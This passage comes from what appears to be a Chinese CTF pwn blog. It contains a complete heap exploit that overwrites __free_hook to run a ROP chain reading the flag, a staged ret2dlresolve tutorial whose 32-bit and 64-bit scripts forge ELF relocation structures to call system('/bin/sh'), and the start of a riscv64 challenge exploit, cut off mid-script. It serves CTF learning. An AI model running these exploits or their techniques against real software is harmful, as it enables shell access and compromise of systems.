完整exp：\nfrom pwn import *from ctypes import *from struct import packbanary = &quot;./orw_h1&quot;elf = ELF(banary)#libc = ELF(&quot;./libc.so.6&quot;)libc=ELF(&quot;/home/youlin/glibc-all-in-one/libs/2.27-3ubuntu1.5_amd64/libc.so.6&quot;)ip = &#x27;&#x27;port = 0local = 1if local:    io = process(banary)else:    io = remote(ip, port)context(log_level = &#x27;debug&#x27;, os = &#x27;linux&#x27;, arch = &#x27;amd64&#x27;)#context(log_level = &#x27;debug&#x27;, os = &#x27;linux&#x27;, arch = &#x27;i386&#x27;)def dbg():    gdb.attach(io)    pause()s = lambda data : io.send(data)sl = lambda data : io.sendline(data)sa = lambda text, data : io.sendafter(text, data)sla = lambda text, data : io.sendlineafter(text, data)r = lambda : io.recv()ru = lambda text : io.recvuntil(text)uu32 = lambda : u32(io.recvuntil(b&quot;\\xff&quot;)[-4:].ljust(4, b&#x27;\\x00&#x27;))uu64 = lambda : u64(io.recvuntil(b&quot;\\x7f&quot;)[-6:].ljust(8, b&quot;\\x00&quot;))iuu32 = lambda : int(io.recv(10),16)iuu64 = lambda : int(io.recv(6),16)uheap = lambda : u64(io.recv(6).ljust(8,b&#x27;\\x00&#x27;))lg = lambda data : io.success(&#x27;%s -&gt; 0x%x&#x27; % (data, eval(data)))ia = lambda : io.interactive()def cmd(choice):    ru(&quot;&gt;&gt; &quot;)    sl(str(choice))def add(size,content):    cmd(1)    ru(&quot;Length of game description:&quot;)    sl(str(size))    ru(&quot;Game description:&quot;)    s(content)def delete(index):    cmd(2)    ru(&quot;game index: &quot;)    sl(str(index))def edit(index,content):    cmd(3)    ru(&quot;game index: &quot;)    sl(str(index))    ru(&quot;Edit Game description:&quot;)    s(content)def show(index):    cmd(4)    ru(&quot;game index: &quot;)    sl(str(index))add(0x410,b&#x27;AAAA&#x27;)#0add(0x10,b&#x27;AAAA&#x27;)#1delete(0)show(0)libcbase=uu64()-0x3ebca0lg(&quot;libcbase&quot;)malloc_hook=libcbase+libc.sym[&#x27;__malloc_hook&#x27;]free_hook=libcbase+libc.sym[&#x27;__free_hook&#x27;]setcontext=libcbase+libc.sym[&#x27;setcontext&#x27;]+53pop_rdi=0x000000000002164f+libcbasepop_rsi=0x0000000000023a6a+libcbasepop_rdx=0x0000000000001b96+libcbaseret=libcbase+0x00000000000008aaopen=libcbase+libc.sym[&#x27;open&#x27;]read=libcbase+libc.sym[&#x27;read&#x27;]write=libcbase+libc.sym[&#x27;write&#x27;]add(0x410,b&#x27;AAAA&#x27;)#2add(0x60,b&#x27;AAAA&#x27;)#3add(0x70,b&#x27;AAAA&#x27;)#4add(0x70,b&#x27;AAAA&#x27;)#5delete(3)delete(4)delete(5)show(5)heapbase=uheap()-0x710lg(&quot;heapbase&quot;)edit(3,p64(free_hook))add(0x60,b&#x27;AAAA&#x27;)#6add(0x60,p64(setcontext))#7heap=heapbase+0x260flag_addr=heap+0x300orw_addr=heap+0xb0orw=p64(pop_rdi)+p64(heap)+p64(pop_rsi)+p64(0)+p64(open)orw+=p64(pop_rdi)+p64(3)+p64(pop_rsi)+p64(flag_addr)+p64(pop_rdx)+p64(0x50)+p64(read)orw+=p64(pop_rdi)+p64(1)+p64(pop_rsi)+p64(flag_addr)+p64(pop_rdx)+p64(0x50)+p64(write)payload=b&#x27;./flag\\x00&#x27;.ljust(0xa0,b&#x27;\\x00&#x27;)payload+=p64(orw_addr)+p64(ret)+orwedit(2,payload)delete(2)ia()\n\n"},{"title":"ret2dlresolve","url":"/2024/04/28/ret2dlresolve/","content":"x86前置知识在Linux中，程序使用_dl_runtime_resolve(link_map,reloc_offset)来对动态链接的函数进行重定位。\n而ret2dlresolve攻击的核心就是控制相应的参数及其对应地址的内容，从而控制解析的函数。\n延迟绑定第一次调用一个函数时，先是到plt表，然后jmp到got表\n\n此时got表存的地址是在plt表上\n\n其实也就是jmp got的下一条指令，这里先是push一个数字（该函数在rel.plt上的偏移,reloc_arg，后文会讲到），然后jmp到plt[0] (0x4004E0)\n\n在plt[0]处先是push got[1]，got[1]就是link_map（链接器的标识信息,后文会讲到），然后jmp到got[2]处，got[2]就是_dl_runtime_resolve函数的地址\n\n\n所以相当于执行了\n_dl_runtime_resolve(link_map,reloc_arg)\n\n这个函数会完成符号的解析，即将真实的write函数地址写入其GOT表对应的条目中，随后将控制器交给被解析的函数\n_dl_fixup_dl_runtime_resolve 函数其实就调用了 _dl_fixup 函数\n_dl_fixup是在glibc-2.23&#x2F;elf&#x2F;dl-runtime.c实现的，我们先分析接下来会用到的一些函数，完整的源码分析在后文\n_dl_fixup(struct link_map *l,ElfW(Word) reloc_arg)&#123;\t// 首先通过参数reloc_arg计算重定位的入口，这里的JMPREL即.rel.plt，reloc_offest即reloc_arg\tconst PLTREL *const reloc = (const void *)(D_PTR(l, l_info[DT_JMPREL]) + reloc_offset);\t// 然后通过reloc-&gt;r_info找到.dynsym中对应的条目\tconst ElfW(Sym) *sym = &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)];\t// 这里还会检查reloc-&gt;r_info的最低位是不是R_386_JMUP_SLOT=7\tassert(ELF(R_TYPE)(reloc-&gt;info) == ELF_MACHINE_JMP_SLOT);\t// 接着通过strtab+sym-&gt;st_name找到符号表字符串，result为libc基地址\tresult = _dl_lookup_symbol_x (strtab + sym -&gt;st_name, l, &amp;sym, l-&gt;l_scope, version, ELF_RTYPE_CLASS_PLT, flags, NULL);\t// value为libc基址加上要解析函数的偏移地址，也即实际地址\tvalue = DL_FIXUP_MAKE_VALUE (result, sym ? (LOOKUP_VALUE_ADDRESS(result) + sym-&gt;st_value) : 0);\t// 最后把value写入相应的GOT表条目中\treturn elf_machine_fixup_plt (l, result, reloc, rel_addr, value);\t&#125;\n\n渐进学习难度是逐渐加深，学习建议是每一步都跟着脚本走一遍，关键地方我都给出了注释，然后最好自己能把每一步都写出来个大概\n前面的一些概念和名词只需要大致知道是个什么东西，不需要深究，到后面自然会逐步加深理解。\n1先编译下面代码，在不leak的情况下如何逐步利用_dl_fixup函数最后getshell\n#include &lt;unistd.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;void vuln()&#123;\tchar buf[100];\tsetbuf(stdin, buf);\tread(0, buf, 256);&#125;int main()&#123;\tchar buf[100] = &quot;Welcome to XDCTF2015~!\\n&quot;;\tsetbuf(stdout, buf);\twrite(1, buf, strlen(buf));\tvuln();\treturn 0;&#125;\n\ngcc -fno-stack-protector -m32 -z relro -no-pie pwn.c -o pwn\n\n保护如下:\n\n首先是先栈迁移到bss段，再手动调用plt[0]，解析write函数，把命令打印出来，我们只需提前push reloc_arg（push 20h）即可完成利用\n对应的是这一句\n_dl_fixup(struct link_map *1,ElfW(Word) reloc_arg)\n\n\nfrom pwn import *from ctypes import *from struct import packbanary = &quot;./pwn&quot;elf = ELF(banary)#libc = ELF(&quot;./libc.so.6&quot;)libc=ELF(&quot;/home/youlin/glibc-all-in-one/libs/2.23-0ubuntu11.3_i386/libc.so.6&quot;)ip = &#x27;&#x27;port = 0local = 1if local:    io = process(banary)else:    io = remote(ip, port)context(log_level = &#x27;debug&#x27;, os = &#x27;linux&#x27;, arch = &#x27;amd64&#x27;)#context(log_level = &#x27;debug&#x27;, os = &#x27;linux&#x27;, arch = &#x27;i386&#x27;)def dbg():    gdb.attach(io)    pause()s = lambda data : io.send(data)sl = lambda data : io.sendline(data)sa = lambda text, data : io.sendafter(text, data)sla = lambda text, data : io.sendlineafter(text, data)r = lambda : io.recv()ru = lambda text : io.recvuntil(text)uu32 = lambda : u32(io.recvuntil(b&quot;\\xff&quot;)[-4:].ljust(4, b&#x27;\\x00&#x27;))uu64 = lambda : u64(io.recvuntil(b&quot;\\x7f&quot;)[-6:].ljust(8, b&quot;\\x00&quot;))iuu32 = lambda : int(io.recv(10),16)iuu64 = lambda : int(io.recv(6),16)uheap = lambda : u64(io.recv(6).ljust(8,b&#x27;\\x00&#x27;))lg = lambda data : io.success(&#x27;%s -&gt; 0x%x&#x27; % (data, eval(data)))ia = lambda : io.interactive()write_plt=elf.plt[&#x27;write&#x27;]write_got=elf.got[&#x27;write&#x27;]leave_ret=0x08048458pop_ebp=0x0804861bpop_3_ret=0x08048619read_plt=elf.plt[&#x27;read&#x27;]ru(&quot;Welcome to XDCTF2015~!\\n&quot;)payload=b&#x27;A&#x27;*0x6c+b&#x27;A&#x27;*4payload+=p32(read_plt)+p32(pop_3_ret)+p32(0)+p32(elf.bss(0x800))+p32(0x100)payload+=p32(pop_ebp)+p32(elf.bss(0x800))+p32(leave_ret)sl(payload) #栈迁移plt_0=0x08048380cmd=b&#x27;/bin/sh\\x00&#x27;payload=b&#x27;A&#x27;*0x4+p32(plt_0)+p32(0x20)+p32(0xbeef)+p32(1)+p32(0x804a85c)+p32(len(cmd))+cmdsl(payload)ia()\n\n\n成功打印出字符串\n2这一步我们控制好reloc_arg的大小，使reloc的位置落在可控地址(bss段)内，在bss段手动伪造出reloc，即伪造.rel.plt中关于write的内容，从而可以控制它的r_info\n对应这一句\n// 通过参数reloc_arg计算重定位的入口，这里的JMPREL即.rel.plt，reloc_offest即reloc_arg\tconst PLTREL *const reloc = (const void *)(D_PTR(l, l_info[DT_JMPREL]) + reloc_offset);\n\n.rel.plt节是用于函数重定位，**.rel.dyn**是用于变量重定位\n下面是rel的结构体定义\ntypedef struct&#123;\tElf32_Addr r_offset; // 对于可执行文件，此值为虚拟地址\tElf32_Word r_info; // 符号表索引&#125;Elf32_Rel;\n\n\n.got节保存了全局变量偏移表，**.got.plt节保存了全局函数偏移表。我们通常说的got表指的是.got.plt。.got.plt对应着Elf32_Rel结构中r_offset**的值\n// 原本是reloc_arg + rel_plt = rel_plt-&gt;write// 伪造成fake_arg + rel_plt = fake_write\n\n只需要更改payload2内容\nplt_0=0x08048380cmd=b&#x27;/bin/sh\\x00&#x27;fake_write_addr=0x804a85c # addr:write_got rel_plt=0x8048330r_info=0x607 #readelf -r pwnpayload=b&#x27;A&#x27;*0x4+p32(plt_0)+p32(fake_write_addr-rel_plt)+p32(0xbeef)+p32(1)+p32(0x804a85c+8)+p32(len(cmd))+p32(elf.got[&#x27;write&#x27;])+p32(r_info)+cmdsl(payload)ia()\n\n\n再次成功调用\n3这一步我们控制好reloc中的r_info，使sym落在可控地址内，从而伪造sym，从而可以控制它的st_name（偏移）\n对应这两句\n   // 然后通过reloc-&gt;r_info找到.dynsym中对应的条目const ElfW(Sym) *sym = &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)];// 这里还会检查reloc-&gt;r_info的最低位是不是R_386_JMUP_SLOT=7assert(ELF(R_TYPE)(reloc-&gt;info) == ELF_MACHINE_JMP_SLOT);\n\n.dynsym节包含了动态链接符号表。ELF32_Sym[num]中的num对应着**ELF_R_SYM(Elf32_Rel-&gt;r_info)**。根据定义，\nELF_R_SYM(Elf32_Rel-&gt;r_info) = (Elf32_Rel-&gt; r_info) &gt;&gt; 8\n\nsym的结构体如下（大小为0x10）\ntypedef struct&#123;\tElf32_Word st_name; // Symbol name(string tbl index)\tElf32_Addr st_value; // Symbol value\tElf32_word st_size; // Symbol size\tunsigned char st_info; // Symbol type and binding\tunsigned char st_other; // symbol visibility under glibc&gt;=2.2\tElf32_Section st_shndx; // Section index&#125;Elf32_Sym;\n\nwrite的索引值为ELF32_R_SYM(0x607) &#x3D; 0x607 &gt;&gt; 8 &#x3D; 6。而Elf32_Sym[6]即保存着write的符号表信息。并且ELF32_R_TYPE(0x607) &#x3D; 7， 对应着R_386_JUMP_SLOT。\nida中的symtab\n\npayload中0x4c的由来： st_name &#x3D; write_strtab - strtab &#x3D; 0x4c\n\n原本：sym[num],num = (write_sym - dynsym) / 16 = 6伪造后：num = (fake_write_sym - dynsym) / 16\n\n更改后的payload2:\ndynsym=0x804732c #readelf -S pwnplt_0=0x08048380cmd=b&#x27;/bin/sh\\x00&#x27;rel_plt=0x8048330align=0x10-((elf.bss(0x800)+36-dynsym)%16)fake_sym_addr=elf.bss(0x800)+36+alignr_info = ((((fake_sym_addr - dynsym)//16) &lt;&lt; 8) | 0x7) # 使其最低位为7，通过检测fake_sym=p32(0x4c)+p32(0)+p32(0)+p32(0x12)cmd_addr=0x804a87cfake_write_addr=0x804a85cpayload=b&#x27;A&#x27;*0x4+p32(plt_0)+p32(fake_write_addr-rel_plt)+p32(pop_3_ret)+p32(1)+p32(cmd_addr)+p32(len(cmd))+p32(elf.got[&#x27;write&#x27;])+p32(r_info)+b&#x27;D&#x27;*align+fake_sym+cmdsl(payload)ia()\n\n\n4相信到了这一步，对于接下来要做什么已经很清楚了，既然在上一步我们能控制st_name，那接下来自然是伪造st_name，从而可以控制字符串表\n对应这一句\n// 接着通过strtab+(sym-&gt;st_name)找到符号表字符串，result为libc基地址\tresult = _dl_lookup_symbol_x (strtab + sym -&gt;st_name, l, &amp;sym, l-&gt;l_scope, version, ELF_RTYPE_CLASS_PLT, flags, NULL);\n\n原本：\tst_name = write_strtab - strtab伪造后：\tfake_name = fake_write_str_addr - strtab\n\nplt_0=0x08048380cmd=b&#x27;/bin/sh\\x00&#x27;rel_plt=0x8048330fake_write_addr=0x804a85cfake_write = flat(p32(elf.got[&#x27;write&#x27;]), p32(0x607))cmd_addr=0x804a884dynsym=0x804732cfake_str_addr=0x804a87cfake_str=b&#x27;write\\x00&#x27;align=0x10-((0x804a864-dynsym)%16)fake_sym_addr=0x804a86cr_info=((((fake_sym_addr-dynsym)//16)&lt;&lt;8)|0x7)fake_sym=p32(0x4c)+p32(0)+p32(0)+p32(0x12)fake_sym_1=p32(0x804a87c-0x8047284)+p32(0)+p32(0)+p32(0x12)payload=b&#x27;A&#x27;*0x4+p32(plt_0)+p32(fake_write_addr-rel_plt)+p32(pop_3_ret)+p32(1)+p32(cmd_addr)+p32(len(cmd))+p32(elf.got[&#x27;write&#x27;])+p32(r_info)+b&#x27;D&#x27;*align+fake_sym_1+fake_str.ljust(8,b&#x27;\\x00&#x27;)+cmdsl(payload)ia()\n\n\n5最后自然就是将write字符串改为system,并且更改一下参数就可以getshell了\nplt_0=0x08048380cmd=b&#x27;/bin/sh\\x00&#x27;rel_plt=0x8048330fake_write_addr=0x804a85cfake_write = flat(p32(elf.got[&#x27;write&#x27;]), p32(0x607))cmd_addr=0x804a884dynsym=0x804732cfake_str_addr=0x804a87cfake_str=b&#x27;system\\x00&#x27;align=0x10-((0x804a864-dynsym)%16)fake_sym_addr=0x804a86cr_info=((((fake_sym_addr-dynsym)//16)&lt;&lt;8)|0x7)fake_sym=p32(0x4c)+p32(0)+p32(0)+p32(0x12)fake_sym_1=p32(0x804a87c-0x8047284)+p32(0)+p32(0)+p32(0x12)#payload=b&#x27;A&#x27;*0x4+p32(plt_0)+p32(0x20)+p32(0xbeef)+p32(1)+p32(0x804a85c)+p32(len(cmd))+cmd#payload=b&#x27;A&#x27;*0x4+p32(plt_0)+p32(fake_write_addr-rel_plt)+p32(0xbeef)+p32(1)+p32(0x804a85c+8)+p32(len(cmd))+p32(elf.got[&#x27;write&#x27;])+p32(0x607)+cmd#payload=b&#x27;A&#x27;*0x4+p32(plt_0)+p32(fake_write_addr-rel_plt)+p32(pop_3_ret)+p32(1)+p32(cmd_addr)+p32(len(cmd))+p32(elf.got[&#x27;write&#x27;])+p32(r_info)+b&#x27;D&#x27;*align+fake_sym+cmdpayload=b&#x27;A&#x27;*0x4+p32(plt_0)+p32(fake_write_addr-rel_plt)+p32(pop_3_ret)+p32(cmd_addr)+p32(cmd_addr)+p32(len(cmd))+p32(elf.got[&#x27;write&#x27;])+p32(r_info)+b&#x27;D&#x27;*align+fake_sym_1+fake_str.ljust(8,b&#x27;\\x00&#x27;)+cmdsl(payload)ia()\n\n\nx64同样先将上面的源码编译\ngcc -fno-stack-protector -z relro -no-pie pwn.c -o pwn\n\n\n64位在这种情况下，如果像32位一样依次伪造reloc，symtab，strtab，会出错，原因是在_dl_fixup函数执行过程中，访问到了一段未映射的地址处，接下来我们结合 _dl_fixup 完整源码进行分析，源码位于 glibc-2.23&#x2F;elf&#x2F;dl-runtime.c ， 在关键位置我都给出了注释，其他位置可忽略\n_dl_fixup (struct link_map *l, ElfW(Word) reloc_arg) // 第一个参数link_map，也就是got[1]&#123;    // 获取link_map中存放DT_SYMTAB的地址  const ElfW(Sym) *const symtab = (const void *) D_PTR (l, l_info[DT_SYMTAB]);    // 获取link_map中存放DT_STRTAB的地址  const char *strtab = (const void *) D_PTR (l, l_info[DT_STRTAB]);\t// reloc_offset就是reloc_arg,获取重定位表项中对应函数的结构体  const PLTREL *const reloc = (const void *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset);    // 根据重定位结构体的r_info得到symtab表中对应的结构体  const ElfW(Sym) *sym = &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)];      void *const rel_addr = (void *)(l-&gt;l_addr + reloc-&gt;r_offset);  lookup_t result;  DL_FIXUP_VALUE_TYPE value;  /* Sanity check that we&#x27;re really looking at a PLT relocation.  */  assert (ELFW(R_TYPE)(reloc-&gt;r_info) == ELF_MACHINE_JMP_SLOT); // 检查r_info的最低位是不是7   /* Look up the target symbol.  If the normal lookup rules are not      used don&#x27;t look in the global scope.  */  if (__builtin_expect (ELFW(ST_VISIBILITY) (sym-&gt;st_other), 0) == 0) // 这里是一层检测，检查sym结构体中的st_other是否为0，正常情况下为0，执行下面代码    &#123;      const struct r_found_version *version = NULL;\t// 这里也是一层检测，检查link_map中的DT_VERSYM是否为NULL，正常情况下不为NULL，执行下面代码      if (l-&gt;l_info[VERSYMIDX (DT_VERSYM)] != NULL)\t&#123;      // 到了这里就是64位下报错的位置，在计算版本号时，vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; 0x7fff的过程中，由于我们一般伪造的symtab位于bss段，就导致在64位下reloc-&gt;r_info比较大,故程序会发生错误。所以要使程序不发生错误，自然想到的办法就是不执行这里的代码，分析上面的代码我们就可以得到两种手段，第一种手段就是使上一行的if不成立，也就是设置link_map中的DT_VERSYM为NULL，那我们就要泄露出link_map的地址，而如果我们能泄露地址，根本用不着ret2dlresolve。第二种手段就是使最外层的if不成立，也就是使sym结构体中的st_other不为0，直接跳到后面的else语句执行。\t  const ElfW(Half) *vernum = (const void *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]);\t  ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; 0x7fff;\t  version = &amp;l-&gt;l_versions[ndx];\t  if (version-&gt;hash == 0)\t    version = NULL;\t&#125;      /* We need to keep the scope around so do some locking.  This is\t not necessary for objects which cannot be unloaded or when\t we are not using any threads (yet).  */      int flags = DL_LOOKUP_ADD_DEPENDENCY;      if (!RTLD_SINGLE_THREAD_P)\t&#123;\t  THREAD_GSCOPE_SET_FLAG ();\t  flags |= DL_LOOKUP_GSCOPE_LOCK;\t&#125;      RTLD_ENABLE_FOREIGN_CALL;\t// 在32位情况下，上面代码运行中不会出错，就会走到这里，这里通过strtab+sym-&gt;st_name找到符号表字符串，result为libc基地址      result = _dl_lookup_symbol_x (strtab + sym-&gt;st_name, l, &amp;sym, l-&gt;l_scope,\t\t\t\t    version, ELF_RTYPE_CLASS_PLT, flags, NULL);      /* We are done with the global scope.  */      if (!RTLD_SINGLE_THREAD_P)\tTHREAD_GSCOPE_RESET_FLAG ();      RTLD_FINALIZE_FOREIGN_CALL;      /* Currently result contains the base load address (or link map)\t of the object that defines sym.  Now add in the symbol\t offset.  */      // 同样，如果正常执行，接下来会来到这里，得到value的值，为libc基址加上要解析函数的偏移地址，也即实际地址，即result+st_value      value = DL_FIXUP_MAKE_VALUE (result, sym ? (LOOKUP_VALUE_ADDRESS (result) + sym-&gt;st_value) : 0);    &#125;  else    &#123;       // 这里就是64位下利用的关键，在最上面的if不成立后，就会来到这里,这里value的计算方式是 l-&gt;l_addr + st_value,我们的目的是使value为我们所需要的函数的地址，所以就得控制两个参数，l_addr 和 st_value      /* We already found the symbol.  The module (and therefore its load\t address) is also known.  */      value = DL_FIXUP_MAKE_VALUE (l, l-&gt;l_addr + sym-&gt;st_value);      result = l;    &#125;  /* And now perhaps the relocation addend.  */  value = elf_machine_plt_value (l, reloc, value);  if (sym != NULL      &amp;&amp; __builtin_expect (ELFW(ST_TYPE) (sym-&gt;st_info) == STT_GNU_IFUNC, 0))    value = elf_ifunc_invoke (DL_FIXUP_VALUE_ADDR (value));  /* Finally, fix up the plt itself.  */  if (__glibc_unlikely (GLRO(dl_bind_not)))    return value;  // 最后把value写入相应的GOT表条目中  return elf_machine_fixup_plt (l, result, reloc, rel_addr, value);&#125;\n\n所以接下来我们的任务就是控制 link_map 中的l_addr和 sym中的st_value\n具体思路为\n伪造 link_map-&gt;l_addr 为libc中已解析函数与想要执行的目标函数的偏移值，如 addr_system-addr_xxx伪造 sym-&gt;st_value 为已经解析过的某个函数的 got 表的位置也就是相当于 value &#x3D; l_addr + st_value &#x3D; addr_system - addr_xxx + real_xxx &#x3D; real_system下面是64位下的sym结构体\ntypedef struct  &#123;    Elf64_Word    st_name;        /* Symbol name (string tbl index) */    unsigned char st_info;        /* Symbol type and binding */    unsigned char st_other;       /* Symbol visibility */    Elf64_Section st_shndx;       /* Section index */    Elf64_Addr    st_value;       /* Symbol value */    Elf64_Xword   st_size;        /* Symbol size */  &#125; Elf64_Sym; \n\n其中\nElf64_Word 32 位Elf64_Section 16 位Elf64_Addr 64 位Elf64_Xword 64 位所以sym结构体的大小为24字节，st_value就位于sym[num]首地址+0x8的位置（ 4 + 1 + 1 + 2）\n我们自然就可以想到，如果，我们把一个函数的got表地址-0x8的位置当作sym表首地址，那么它的st_value的值就是这个函数的got表上的值，也就是实际地址，此时它的st_other恰好不为0\n再来看link_map的结构\nstruct link_map &#123;    Elf64_Addr l_addr;    char *l_name;    Elf64_Dyn *l_ld;    struct link_map *l_next;    struct link_map *l_prev;    struct link_map *l_real;    Lmid_t l_ns;    struct libname_list *l_libname;        Elf64_Dyn *l_info[76];  //l_info 里面包含的就是动态链接的各个表的信息    ...    size_t l_tls_firstbyte_offset;    ptrdiff_t l_tls_offset;    size_t l_tls_modid;    size_t l_tls_dtor_count;    Elf64_Addr l_relro_addr;    size_t l_relro_size;        unsigned long long l_serial;        struct auditstate l_audit[];&#125;\n\n这里的.dynamic节就对应l_info的内容\n\n所以如果我们伪造一个link_map表，很容易就可以控制 l_addr ，通过阅读源码，我们知道_dl_fixup主要用了 l_info 的内容 ，也就是其中JMPREL,STRTAB,SYMTAB的地址。\n所以我们需要伪造这个数组里的几个指针\nDT_STRTAB指针：位于link_map_addr +0x68(32位下是0x34)\nDT_SYMTAB指针：位于link_map_addr + 0x70(32位下是0x38)\nDT_JMPREL指针：位于link_map_addr +0xF8(32位下是0x7C)\n然后伪造三个elf64_dyn即可，dynstr只需要指向一个可读的地方，因为这里我们没有用到\n64位下重定位表项与32位有所不同\ntypedef struct&#123;  Elf64_Addr        r_offset;                /* Address */  Elf64_Xword        r_info;                        /* Relocation type and symbol index */  Elf64_Sxword        r_addend;                /* Addend */&#125; Elf64_Rela;/* How to extract and insert information held in the r_info field.  */#define ELF64_R_SYM(i)                        ((i) &gt;&gt; 32)#define ELF64_R_TYPE(i)                        ((i) &amp; 0xffffffff)#define ELF64_R_INFO(sym,type)                ((((Elf64_Xword) (sym)) &lt;&lt; 32) + (type))\n\n这里 Elf64_Addr、Elf64_Xword、Elf64_Sxword 都为 64 位，因此 Elf64_Rela 结构体的大小为 24 （0x18）字节。\n\n在这里可以看到，write 函数在符号表中的偏移为 1（0x100000007h&gt;&gt;32）\n除此之外，在 64 位下，plt 中的代码 push 的是待解析符号在重定位表中的索引，而不是偏移。比如，write 函数 push 的是 0，对应上图第一个位置\n\n接下来我们伪造link_map，know_func_ptr为已解析函数的got表地址，offset为system函数与这个函数在libc上的偏移，由于我们只需要在link_map特定的几个位置伪造指针，而中间的内容不会用到，所以我们就把伪造的rel.plt,symtab放在中间，方便理解可从下往上读代码。\nfrom pwn import *from ctypes import *from struct import packbanary = &quot;./pwn&quot;elf = ELF(banary)libc = ELF(&quot;/home/youlin/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6&quot;)#libc=ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)ip = &#x27;&#x27;port = 0local = 1if local:    io = process(banary)else:    io = remote(ip, port)context(log_level = &#x27;debug&#x27;, os = &#x27;linux&#x27;, arch = &#x27;amd64&#x27;)#context(log_level = &#x27;debug&#x27;, os = &#x27;linux&#x27;, arch = &#x27;i386&#x27;)def dbg():    gdb.attach(io)    pause()s = lambda data : io.send(data)sl = lambda data : io.sendline(data)sa = lambda text, data : io.sendafter(text, data)sla = lambda text, data : io.sendlineafter(text, data)r = lambda : io.recv()ru = lambda text : io.recvuntil(text)uu32 = lambda : u32(io.recvuntil(b&quot;\\xff&quot;)[-4:].ljust(4, b&#x27;\\x00&#x27;))uu64 = lambda : u64(io.recvuntil(b&quot;\\x7f&quot;)[-6:].ljust(8, b&quot;\\x00&quot;))iuu32 = lambda : int(io.recv(10),16)iuu64 = lambda : int(io.recv(6),16)uheap = lambda : u64(io.recv(6).ljust(8,b&#x27;\\x00&#x27;))lg = lambda data : io.success(&#x27;%s -&gt; 0x%x&#x27; % (data, eval(data)))ia = lambda : io.interactive()def fake_Linkmap_payload(fake_linkmap_addr,known_func_ptr,offset):    # &amp;(2**64-1)是因为offset为负数，如果不控制范围，p64后会越界，发生错误    linkmap = p64(offset &amp; (2 ** 64 - 1))#l_addr    # fake_linkmap_addr + 8，也就是DT_JMPREL，至于为什么有个0，可以参考IDA上.dyamisc的结构内容    linkmap += p64(0) # 可以为任意值    linkmap += p64(fake_linkmap_addr + 0x18) # 这里的值就是伪造的.rel.plt的地址    # fake_linkmap_addr + 0x18,fake_rel_write,因为write函数push的索引是0，也就是第一项    linkmap += p64((fake_linkmap_addr + 0x30 - offset) &amp; (2 ** 64 - 1)) # Rela-&gt;r_offset,正常情况下这里应该存的是got表对应条目的地址，解析完成后在这个地址上存放函数的实际地址，此处我们只需要设置一个可读写的地址即可     linkmap += p64(0x7) # Rela-&gt;r_info,用于索引symtab上的对应项，7&gt;&gt;32=0，也就是指向symtab的第一项    linkmap += p64(0)# Rela-&gt;r_addend,任意值都行    linkmap += p64(0)#l_ns    # fake_linkmap_addr + 0x38, DT_SYMTAB     linkmap += p64(0) # 参考IDA上.dyamisc的结构    linkmap += p64(known_func_ptr - 0x8) # 这里的值就是伪造的symtab的地址,为已解析函数的got表地址-0x8    linkmap += b&#x27;/bin/sh\\x00&#x27;    linkmap = linkmap.ljust(0x68,b&#x27;A&#x27;)    linkmap += p64(fake_linkmap_addr) # fake_linkmap_addr + 0x68, 对应的值的是DT_STRTAB的地址，由于我们用不到strtab，所以随意设置了一个可读区域    linkmap += p64(fake_linkmap_addr + 0x38) # fake_linkmap_addr + 0x70 , 对应的值是DT_SYMTAB的地址    linkmap = linkmap.ljust(0xf8,b&#x27;A&#x27;)    linkmap += p64(fake_linkmap_addr + 0x8) # fake_linkmap_addr + 0xf8, 对应的值是DT_JMPREL的地址    return linkmapread_plt=elf.plt[&#x27;read&#x27;]pop_rbp=0x00000000004005e0bss_addr=elf.bss(0x500)pop_rdi=0x00000000004007b3pop_rsi_r15=0x00000000004007b1leave_ret=0x00000000004006abl_addr=libc.sym[&#x27;system&#x27;]-libc.sym[&#x27;read&#x27;]plt_load=0x000000000400516 #jmp     cs:qword_601010link_map=fake_Linkmap_payload(bss_addr,elf.got[&#x27;read&#x27;],l_addr)ru(&quot;Welcome to XDCTF2015~!&quot;)payload=b&#x27;A&#x27;*0x70+b&#x27;A&#x27;*8+p64(pop_rdi)+p64(0)+p64(pop_rsi_r15)+p64(bss_addr)+p64(0)+p64(read_plt)+p64(pop_rsi_r15)+p64(0)+p64(0)+p64(pop_rdi)+p64(bss_addr+0x48)+p64(plt_load)+p64(bss_addr)+p64(0)sl(payload)sleep(0.5)sl(link_map)ia()\n\n"},{"title":"riscv64调试记录","url":"/2023/09/25/riscv64%E8%B0%83%E8%AF%95%E8%AE%B0%E5%BD%95/","content":"risky_login题目本身并没有什么难度,由于IDA对riscv64架构并不支持反编译查看伪代码，所以本题使用ghidra进行逆向\n\n在FUN_12345786函数中存在明显的栈溢出，但是需要绕过\n8 &lt; (byte)sVar1\n\n这里有一个很明显的类型混淆，使用gpt搜索发现byte的范围是0-0xff，而size要比这大很多，所以有个比较明显的整数溢出，当param_1的长度大于等于0x100且小于0x108时可以满足这个条件。\n并且本题存在后门函数\n\n大概可以猜测出本题本题溢出长度就为0x100，然后就是绕过后门函数当中的过滤了，这里使用*自动补全就可以实现了\nexp：\nfrom pwn import *from ctypes import *from struct import packbanary = &quot;./pwn&quot;elf = ELF(banary)libc = ELF(&quot;./libc.so.6&quot;)#libc=ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)ip = &#x27;tcp.cloud.dasctf.com&#x27;port = 28250local = 1if local:#    io = process([&quot;qemu-riscv64-static&quot;,&quot;-L&quot;,&quot;/usr/riscv64-linux-gnu/&quot;,banary])    io = process([&quot;qemu-riscv64-static&quot;,&quot;-L&quot;,&quot;/usr/riscv64-linux-gnu/&quot;,&quot;-g&quot;,&quot;1234&quot;,banary])else:    io = remote(ip, port)context(log_level = &#x27;debug&#x27;, os = &#x27;linux&#x27;, arch = &#x27;amd64&#x27;)#context(log_level = &#x27;debug&#x27;, os = &#x27;linux&#x27;, arch = &#x27;i386&#x27;)def dbg():    gdb.attach(io)    pause()s = lambda data : io.send(data)sl = lambda data : io.sendline(data)sa = lambda text, data : io.sendafter(text, data)sla = lambda text, data : io.sendlineafter(text, data)r = lambda : io.recv()ru = lambda text : 